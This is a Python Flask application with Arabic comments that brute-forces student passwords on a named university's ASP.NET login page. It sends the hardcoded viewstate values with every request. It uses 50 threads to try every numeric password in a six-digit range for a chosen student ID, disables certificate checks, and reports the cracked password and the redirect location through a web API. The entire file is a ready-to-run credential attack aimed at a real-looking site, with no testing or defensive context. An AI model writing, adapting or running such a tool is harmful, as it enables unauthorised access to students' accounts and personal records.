from flask import Flask, render_template, request, jsonify
import threading
import requests
import time
import json
import os
from queue import Queue
from datetime import datetime

app = Flask(__name__)

# إعدادات البحث
START_PASSWORD = 100000
END_PASSWORD = 109999
BASE_URL = "https://eng.modern-academy.edu.eg/university/student/login.aspx"
VIEWSTATE = "/wEPDwUILTQ5MDEwMjJkZGW+XxHgaTLNHTGZl9W0amOxF73yJ4Co+eVqmdlQH50+"
VIEWSTATEGENERATOR = "B71B77C3"

# حالة البحث
search_active = False
search_results = []
current_progress = 0
total_passwords = END_PASSWORD - START_PASSWORD + 1
checked_passwords = set()
found_password = None
found_location = None
successful_attempts = 0
failed_attempts = 0
search_speed = 0
start_time = None
student_id_current = ""

# Queue للمعالجة
password_queue = Queue()
num_threads = 50

def worker(thread_id):
    """دالة المعالجة في الخلفية"""
    global search_active, current_progress, checked_passwords
    global found_password, found_location, successful_attempts, failed_attempts
    global search_speed
    
    session = requests.Session()
    local_checked = 0
    last_time = time.time()
    
    while search_active and not found_password:
        try:
            password = password_queue.get(timeout=1)
        except:
            break
        
        if str(password) in checked_passwords:
            password_queue.task_done()
            continue
        
        try:
            data = {
                "__EVENTTARGET": "ctl00$Main$btnLogin",
                "__EVENTARGUMENT": "",
                "__VIEWSTATE": VIEWSTATE,
                "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,
                "ctl00$Main$txtID": student_id_current,
                "ctl00$Main$txtPassword": str(password)
            }
            
            response = session.post(
                BASE_URL,
                headers={"User-Agent": "Mozilla/5.0"},
                data=data,
                allow_redirects=False,
                verify=False,
                timeout=3
            )
            
            checked_passwords.add(str(password))
            current_progress = len(checked_passwords)
            
            if response.status_code == 302:
                found_password = str(password)
                found_location = response.headers.get('Location', '')
                search_active = False
                password_queue.task_done()
                break
            else:
                failed_attempts += 1
                
        except Exception as e:
            failed_attempts += 1
            checked_passwords.add(str(password))
            current_progress = len(checked_passwords)
        
        local_checked += 1
        password_queue.task_done()
        
        # حساب السرعة
        current_time = time.time()
        if current_time - last_time >= 1:
            search_speed = local_checked / (current_time - last_time)
            local_checked = 0
            last_time = current_time

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/start', methods=['POST'])
def start_search():
    global search_active, checked_passwords, found_password
    global found_location, successful_attempts, failed_attempts
    global password_queue, start_time, student_id_current
    
    data = request.json
    student_id = data.get('student_id')
    start_range = data.get('start_range', START_PASSWORD)
    end_range = data.get('end_range', END_PASSWORD)
    
    if not student_id:
        return jsonify({'error': 'رقم الطالب مطلوب'}), 400
    
    if search_active:
        return jsonify({'error': 'بحث قيد التشغيل حالياً'}), 400
    
    # إعادة تعيين المتغيرات
    search_active = True
    checked_passwords = set()
    found_password = None
    found_location = None
    successful_attempts = 0
    failed_attempts = 0
    student_id_current = student_id
    
    # إنشاء queue جديدة
    password_queue = Queue()
    for p in range(int(start_range), int(end_range) + 1):
        password_queue.put(p)
    
    start_time = time.time()
    
    # بدء الـ threads
    for i in range(min(num_threads, password_queue.qsize())):
        thread = threading.Thread(target=worker, args=(i,))
        thread.daemon = True
        thread.start()
    
    return jsonify({'status': 'started', 'total': password_queue.qsize()})

@app.route('/api/stop', methods=['POST'])
def stop_search():
    global search_active
    search_active = False
    return jsonify({'status': 'stopped'})

@app.route('/api/status', methods=['GET'])
def get_status():
    global search_active, current_progress, total_passwords
    global found_password, found_location, successful_attempts
    global failed_attempts, search_speed, start_time
    
    elapsed = time.time() - start_time if start_time else 0
    remaining = total_passwords - current_progress
    
    return jsonify({
        'active': search_active,
        'found': found_password is not None,
        'found_password': found_password,
        'found_location': found_location,
        'progress': (current_progress / total_passwords) * 100 if total_passwords > 0 else 0,
        'checked': current_progress,
        'total': total_passwords,
        'remaining': remaining,
        'successful': successful_attempts,
        'failed': failed_attempts,
        'speed': int(search_speed),
        'elapsed': int(elapsed),
        'eta': int(remaining / search_speed) if search_speed > 0 and remaining > 0 else 0
    })

@app.route('/api/results', methods=['GET'])
def get_results():
    return jsonify({
        'found': found_password,
        'location': found_location,
        'checked': len(checked_passwords)
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
